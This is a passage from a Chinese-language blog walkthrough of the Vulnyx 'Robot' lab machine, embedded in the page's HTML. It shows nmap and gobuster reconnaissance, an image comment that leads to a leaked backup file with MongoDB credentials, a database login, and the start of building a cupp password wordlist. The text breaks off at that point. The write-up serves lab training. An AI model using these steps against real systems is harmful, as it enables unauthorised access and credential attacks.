@@ -1,0 +1,799 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：https:&#x2F;&#x2F;vulnyx.com&#x2F; 难度：Low">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vlx_Robot">
+<meta property="og:url" content="http://miao-sec.github.io/Vulnyx/Vlx_Robot/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：https:&#x2F;&#x2F;vulnyx.com&#x2F; 难度：Low">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211621426.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211710017.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211622664.png">
+<meta property="article:published_time" content="2026-01-21T15:10:56.000Z">
+<meta property="article:modified_time" content="2026-03-11T06:53:43.108Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="图片隐写">
+<meta property="article:tag" content="SSH_bruf">
+<meta property="article:tag" content="MongoDB">
+<meta property="article:tag" content="Cupp">
+<meta property="article:tag" content="Sudo_sh">
+<meta property="article:tag" content="Sudo_python3">
+<meta property="article:tag" content="Sudo_awk">
+<meta property="article:tag" content="Sudo_zzuf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211621426.png">
+  
+  
+  
+  <title>Vlx_Robot - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Vlx_Robot"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-21 23:10" pubdate>
+          2026年1月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Vlx_Robot</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：<a target="_blank" rel="noopener" href="https://vulnyx.com/">https://vulnyx.com/</a></p>
+<p>难度：Low</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 15:58 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0012s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00079s latency).<br>MAC Address: 08:00:27:75:F0:11 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.54<br>Host is up (0.00061s latency).<br>MAC Address: 08:00:27:63:FD:83 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.50 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.54</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.54                   <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 15:59 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.54<br>Host is up (0.00093s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>27017/tcp open  mongod<br>MAC Address: 08:00:27:63:FD:83 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.66 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、80、27017</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,80,27017 192.168.2.54<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 16:00 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.54<br>Host is up (0.0011s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)<br>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)<br>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.56 ((Debian))<br>|_http-title: Hello Friend<br>|_http-server-header: Apache/2.4.56 (Debian)<br>27017/tcp open  mongodb MongoDB 5.0.21 4.1.1 - 5.0<br>| mongodb-databases: <br>|   code = 13<br>|   errmsg = <span class="hljs-built_in">command</span> listDatabases requires authentication<br>|   codeName = Unauthorized<br>|_  ok = 0.0<br>| mongodb-info: <br>|   MongoDB Build info<br>|     storageEngines<br>|       0 = devnull<br>|       2 = wiredTiger<br>|       1 = ephemeralForTest<br>|     version = 5.0.21<br>|     sysInfo = deprecated<br>|     modules<br>|     ok = 1.0<br>|     maxBsonObjectSize = 16777216<br>|     versionArray<br>|       0 = 5<br>|       3 = 0<br>|       2 = 21<br>|       1 = 0<br>|     allocator = tcmalloc<br>|     gitVersion = 4fad44a858d8ee2d642566fc8872ef410f6534e4<br>|     bits = 64<br>|     javascriptEngine = mozjs<br>|     openssl<br>|       running = OpenSSL 1.1.1n  15 Mar 2022<br>|       compiled = OpenSSL 1.1.1n  15 Mar 2022<br>|     buildEnvironment<br>|       linkflags = -Wl,--fatal-warnings -pthread -Wl,-z,now -fuse-ld=gold -fstack-protector-strong -Wl,--no-threads -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags<br>|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -ggdb -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -Wa,--nocompress-debug-sections -fno-builtin-memcmp<br>|       cc = /opt/mongodbtoolchain/v3/bin/gcc: gcc (GCC) 8.5.0<br>|       target_arch = x86_64<br>|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -fsized-deallocation -std=c++17<br>|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 BOOST_THREAD_VERSION 5 BOOST_THREAD_USES_DATETIME BOOST_SYSTEM_NO_DEPRECATED BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR ABSL_FORCE_ALIGNED_ACCESS<br>|       distarch = x86_64<br>|       distmod = debian10<br>|       target_os = linux<br>|       cxx = /opt/mongodbtoolchain/v3/bin/g++: g++ (GCC) 8.5.0<br>|     debug = <span class="hljs-literal">false</span><br>|   Server status<br>|     code = 13<br>|     errmsg = <span class="hljs-built_in">command</span> serverStatus requires authentication<br>|     codeName = Unauthorized<br>|_    ok = 0.0<br>MAC Address: 08:00:27:63:FD:83 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|router<br>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.51 seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.54                          <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 16:00 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.54<br>Host is up (0.0010s latency).<br>All 100 scanned ports on 192.168.2.54 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:63:FD:83 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.29 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80网站"><a href="#1、80网站" class="headerlink" title="1、80网站"></a>1、80网站</h2><p>访问80端口，是一张图片 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211621426.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>将图片下载到本地，使用<code>exiftool</code>查看图片信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# exiftool image.jpg                            <br>ExifTool Version Number         : 13.44<br>File Name                       : image.jpg<br>Directory                       : .<br>File Size                       : 682 kB<br>File Modification Date/Time     : 2023:10:06 20:50:53+08:00<br>File Access Date/Time           : 2026:01:21 16:20:13+08:00<br>File Inode Change Date/Time     : 2026:01:21 16:19:05+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>Comment                         : B4ckUp_3LLi0t/<br>Image Width                     : 1920<br>Image Height                    : 1080<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 1920x1080<br>Megapixels                      : 2.1<br></code></pre></td></tr></table></figure>
+
+<p>发现存在目录<code>B4ckUp_3LLi0t/</code>，进行访问，发现还是一张图片 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211710017.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"> 继续将文件下载下来，没有发现有用的信息，尝试进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.54/B4ckUp_3LLi0t/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.8.2<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.54/B4ckUp_3LLi0t/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.8.2<br>[+] Extensions:              js,php,txt,html,bak,md,db<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>index.html           (Status: 200) [Size: 481]<br>connect.bak          (Status: 200) [Size: 266]<br></code></pre></td></tr></table></figure>
+
+<p>找到一个备份文件<code>connect.bak</code>，进行下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> connect.bak     <br>&lt;?php<br><br><span class="hljs-variable">$client</span> = new MongoDB\Client(<br>    <span class="hljs-string">&#x27;mongodb://127.0.0.1:27017&#x27;</span><br>    [<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;mongo&#x27;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;m0ng0P4zz&#x27;</span>,<br>        <span class="hljs-string">&#x27;ssl&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>        <span class="hljs-string">&#x27;replicaSet&#x27;</span> =&gt; <span class="hljs-string">&#x27;myReplicaSet&#x27;</span>,<br>        <span class="hljs-string">&#x27;authSource&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>        <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;elliot&#x27;</span>,<br>    ],<br>);<br></code></pre></td></tr></table></figure>
+
+<p>发现是<code>mongodb</code>数据库的账号和密码</p>
+<h2 id="2、27017-MongoDB"><a href="#2、27017-MongoDB" class="headerlink" title="2、27017-MongoDB"></a>2、27017-MongoDB</h2><p>访问27017端口，显示看起来你正试图通过原生驱动程序端口的HTTP访问MongoDB。 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601211622664.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>经过信息扫描，发现MongoDB的版本为5.0.21</p>
+<h1 id="三、MongoDB"><a href="#三、MongoDB" class="headerlink" title="三、MongoDB"></a>三、MongoDB</h1><p>使用MongoDB的账号和密码进行连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# mongo --host 192.168.2.54 -u mongo -p m0ng0P4zz elliot <br>MongoDB shell version v7.0.14<br>connecting to: mongodb://192.168.2.54:27017/elliot?compressors=disabled&amp;gssapiServiceName=mongodb<br>Implicit session: session &#123; <span class="hljs-string">&quot;id&quot;</span> : UUID(<span class="hljs-string">&quot;46152d63-89ed-44e9-8b99-d538e661f1ee&quot;</span>) &#125;<br>MongoDB server version: 5.0.21<br>WARNING: shell and server versions <span class="hljs-keyword">do</span> not match<br>================<br>Warning: the <span class="hljs-string">&quot;mongo&quot;</span> shell has been superseded by <span class="hljs-string">&quot;mongosh&quot;</span>,<br><span class="hljs-built_in">which</span> delivers improved usability and compatibility.The <span class="hljs-string">&quot;mongo&quot;</span> shell has been deprecated and will be removed <span class="hljs-keyword">in</span><br>an upcoming release.<br>For installation instructions, see<br>https://docs.mongodb.com/mongodb-shell/install/<br>================<br>Welcome to the MongoDB shell.<br>For interactive <span class="hljs-built_in">help</span>, <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br>For more comprehensive documentation, see<br>        https://docs.mongodb.com/<br>Questions? Try the MongoDB Developer Community Forums<br>        https://community.mongodb.com<br>&gt; <br></code></pre></td></tr></table></figure>
+
+<p>查看数据库信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; show dbs<br>elliot  0.000GB<br>&gt; use elliot<br>switched to db elliot<br>&gt; show collections<br>elliot<br>&gt; db.elliot.<span class="hljs-function"><span class="hljs-title">find</span></span>()<br>&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;651fdd9171f44c265b976d17&quot;</span>), <span class="hljs-string">&quot;FirstName&quot;</span> : <span class="hljs-string">&quot;Elliot&quot;</span>, <span class="hljs-string">&quot;Surname&quot;</span> : <span class="hljs-string">&quot;Alderson&quot;</span>, <span class="hljs-string">&quot;Nickname&quot;</span> : <span class="hljs-string">&quot;MrRobot&quot;</span>, <span class="hljs-string">&quot;Birthdate&quot;</span> : <span class="hljs-string">&quot;17091986&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>根据拿到的信息，提示我们去生成一个字典，使用<code>cupp</code>进行生成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 